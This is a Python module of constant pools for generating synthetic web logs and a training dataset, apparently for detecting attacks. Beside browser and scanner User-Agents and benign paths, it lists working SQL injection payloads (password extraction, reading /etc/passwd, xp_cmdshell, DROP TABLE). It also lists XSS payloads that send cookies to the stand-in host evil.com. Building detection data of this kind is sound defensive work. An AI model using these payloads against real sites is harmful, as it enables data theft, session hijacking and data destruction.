"""
Constant pools consumed by the log and dataset generators.

This module centralises User-Agent strings, URL path pools, and attack
payloads so that both ``generate_logs.py`` and ``generate_dataset.py``
draw from a single, consistent source of truth.
"""

from core.mitre import LOGIN_PATHS

# ---------------------------------------------------------------------------
# User-Agent pools
# ---------------------------------------------------------------------------

# Mainstream desktop and mobile browsers.
UA_NORMAL: list[str] = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
]

# Offensive security tools and automation clients.
UA_TOOLS: list[str] = [
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "sqlmap/1.6.12 (Python 3.11)",
    "XSS-Scanner/2.0",
    "Nikto/2.1.6",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Wget/1.21.4",
    "libwww-perl/6.72",
    "masscan/1.3.2",
    "nmap/7.94",
]

# Legitimate search-engine and SEO crawlers.
UA_BOTS: list[str] = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "AhrefsBot/7.0 (+http://ahrefs.com/robot/)",
    "bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "DotBot/1.2 (+https://opensiteexplorer.org/dotbot)",
    "YandexBot/3.0 (+http://yandex.com/bots)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
]


# ---------------------------------------------------------------------------
# URL path pools — normal (benign) traffic
# ---------------------------------------------------------------------------

PUBLIC_PAGE_PATHS: list[str] = [
    "/",
    "/index.html",
    "/about",
    "/contact",
    "/docs",
    "/help",
    "/faq",
    "/blog/post/123",
    "/blog/post/456",
    "/profile",
    "/settings",
]

CATALOG_PATHS: list[str] = [
    "/products",
    "/products?category=electronics",
    "/products?category=books",
    "/search?q=laptop",
    "/search?q=phone",
    "/api/search?q=laptop",
    "/cart",
    "/checkout",
]

API_READ_PATHS: list[str] = [
    "/api/items",
    "/api/items?page=1",
    "/api/items?page=2&limit=20",
    "/api/users",
    "/api/users/me",
    "/api/search",
]

STATIC_PATHS: list[str] = [
    "/static/app.js",
    "/static/site.css",
    "/images/logo.png",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
]

# Login and authentication flow endpoints.
AUTH_FLOW_PATHS: list[str] = [
    "/login",
    "/signin",
    "/auth/login",
    "/account/login",
    "/user/login",
]

# Legitimate paths that superficially resemble attack patterns (hard negatives
# for training).  Includes admin panels visited by real users, search queries
# containing SQL-like words, and monitoring/healthcheck endpoints.
BENIGN_EDGE_PATHS: list[str] = [
    "/admin",
    "/admin/login",
    "/admin/dashboard",
    "/admin/settings",
    "/admin/users",
    "/search?q=union+square+hotel",
    "/search?q=select+phone",
    "/search?q=drop+shipping+guide",
    "/search?q=delete+account+how",
    "/docs/sql/select-basics",
    "/docs/frontend/onload-events",
    "/docs/security/xss-prevention",
    "/api/search?q=script+tag+tutorial",
    "/products?sort=order+by+price",
    "/search?q=%3C3+sale",
    "/config/public",
    "/health",
    "/status",
    "/actuator/info",
    "/server-status",
    "/api/debug/version",
    "/backup/status",
    "/.well-known/security.txt",
    "/robots.txt",  # NOTE: also in STATIC_PATHS; duplicate kept to weight NORMAL_PATHS sampling
    "/swagger-ui/index.html",
]

# Union of all benign path pools — used by generators for ``rng.choice()``.
NORMAL_PATHS: list[str] = (
    PUBLIC_PAGE_PATHS + CATALOG_PATHS + API_READ_PATHS
    + STATIC_PATHS + AUTH_FLOW_PATHS + BENIGN_EDGE_PATHS
)

# Endpoints targeted during DoS/DDoS floods.
DOS_PATHS: list[str] = ["/api/items", "/api/items?page=1", "/api/search", "/"]


# ---------------------------------------------------------------------------
# Attack payloads — SQL Injection
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: list[str] = [
    # Classic / error-based
    "/products?id=1 OR 1=1",
    "/products?id=1' OR '1'='1",
    "/products?id=1\" OR \"1\"=\"1",
    "/api/items?filter=1; SELECT 1,2,3--",
    "/api/users?id=1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    # UNION-based
    "/api/items?search=' UNION SELECT NULL,NULL--",
    "/api/items?search=' UNION SELECT password,username FROM users--",
    "/api/items?search=' UNION ALL SELECT concat(username,0x3a,password) FROM users--",
    "/products?sort=name UNION SELECT null,load_file('/etc/passwd')--",
    # Blind / time-based
    "/index.html?q=1' AND SLEEP(5)--",
    "/api/data?id=1' AND BENCHMARK(5000000,MD5('test'))--",
    "/products?id=1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "/api/items?page=1' WAITFOR DELAY '0:0:5'--",
    # Error-based extraction
    "/products?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "/api/v2?id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Schema enumeration
    "/search?q=1' ORDER BY 10--",
    "/search?q=1' HAVING 1=1--",
    "/api/items?filter=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    # Stacked queries / command exec
    "/api/v2/items?id=1; EXEC xp_cmdshell('whoami')--",
    "/products?id=1; DROP TABLE users--",
    # URL-encoded / obfuscated
    "/products?id=1%27%20OR%20%271%27%3D%271",
    "/api/items?q=1%27%20UNION%20SELECT%20load_file(%27/etc/passwd%27)--",
    "/search?q=%31%27%20%4f%52%20%31%3d%31--",
    # Second-order / out-of-band
    "/register?username=admin'--",
    "/api/items?sort=1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd')--",
]

# ---------------------------------------------------------------------------
# Attack payloads — Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------

XSS_PAYLOADS: list[str] = [
    # Script injection (raw and URL-encoded)
    "/search?q=<script>alert(1)</script>",
    "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/search?q=<script>alert(document.domain)</script>",
    # Event handler injection
    "/comments?text=<img src=x onerror=alert(1)>",
    "/comments?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "/profile?name=\"><svg onload=alert(document.cookie)>",
    "/profile?bio=<details open ontoggle=alert(1)>",
    "/search?q=<body onload=alert('xss')>",
    "/api/name?v=<input autofocus onfocus=alert(1)>",
    "/page?title=<marquee onstart=alert(1)>test</marquee>",
    # JavaScript protocol
    "/redirect?next=javascript:alert(1)",
    "/comments?link=javascript:void(fetch('//evil.com?c='+document.cookie))",
    # Iframe / object injection
    "/search?q=<iframe src='javascript:alert(1)'>",
    "/search?q=<object data='javascript:alert(1)'>",
    # DOM-based / data exfil
    "/api/feedback?msg=<script>new Image().src='//evil.com/?c='+document.cookie</script>",
    "/search?q=<script>fetch('//evil.com/steal?cookie='+document.cookie)</script>",
    # Template / expression injection
    "/search?q={{7*7}}",
    "/search?q=${7*7}",
    # SVG / polyglots
    "/comments?text=<svg><script>alert(1)</script></svg>",
    "/comments?text=<svg/onload=alert('XSS')>",
    # Encoded variants
    "/search?q=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C%2Fscript%3E",
    "/comments?msg=<a href=javascript:alert(1)>click</a>",
    # CSS injection
    "/profile?style=<style>@import%20'javascript:alert(1)'</style>",
]
